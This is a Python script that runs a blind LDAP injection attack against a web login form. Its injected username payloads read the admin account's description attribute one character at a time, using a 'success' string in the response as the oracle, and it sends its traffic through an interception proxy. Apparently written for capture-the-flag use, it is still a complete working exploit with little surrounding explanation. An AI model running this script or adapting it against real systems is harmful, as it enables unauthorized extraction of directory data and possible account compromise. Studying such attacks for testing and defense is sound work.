#!/usr/bin/env python3
import requests, signal, string, sys

# variables
URL = "http://IP:PORT/"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
TRUE_COND = "success"
CHARACTERS = string.ascii_letters + string.digits + "{}()_" # string.printable
TIMEOUT = 10
PROXY = {"http": "http://IP:8080", "https": "http://IP:8080"}

# Ctrl+C
def handlerCrtlC(sig, frame):
    messages.warning("Exit...", True)
signal.signal(signal.SIGINT, handlerCrtlC)

# color class
class color:
   BLUE = "\033[0;34;48m"
   CYAN = "\033[0;36;48m"
   GREEN = "\033[0;32;48m"   
   YELLOW = "\033[0;33;48m"
   RED = "\033[0;31;48m"
   END = "\033[0;37;0m"

# messages class
class messages:
    def exit_program(exit):
        if exit:
            sys.exit()

    def success(message, exit=False):
        print(color.GREEN + "[i] " + message + color.END)
        messages.exit_program(exit)

    def warning(message, exit=False):
        print(color.YELLOW + "[!] " + message + color.END)
        messages.exit_program(exit)

    def error(message, exit=False):
        print(color.RED + "[x] " + message + color.END)
        messages.exit_program(exit)

# LDAP injection execution
def ldap_injection_exec(payload):
    try:        
        res = requests.post(URL, headers=HEADERS, data=payload, proxies=PROXY, timeout=TIMEOUT, verify=False)
        if TRUE_COND in res.text:
            return True
        return False
    
    except Exception as e:
        messages.error(str(e), True)

# LDAP injection blind
def ldap_injection_blind(max_length=50):
    exfiltration = ""

    for length in range(max_length):
        flag = False
        for character in CHARACTERS:
            # (&(uid=username)(password=password))
            # username = admin)(|(description=x*
            # password = 123456)
            # (&(uid=admin)(|(description=x*)(password=123456)))
            payload = {"username": f"admin)(|(description={exfiltration}{character}*", "password": "123456)"}
            if ldap_injection_exec(payload):
                exfiltration += character
                messages.success(exfiltration)
                flag = True
                break
        if not flag: break

    if exfiltration:
        print(color.CYAN + f"\n{exfiltration}\n" + color.END)
    else:
        messages.warning("Information not exfiltrated")

# main
if __name__ == "__main__":    
    # start script
    print()
    # LDAP injection blind
    ldap_injection_blind()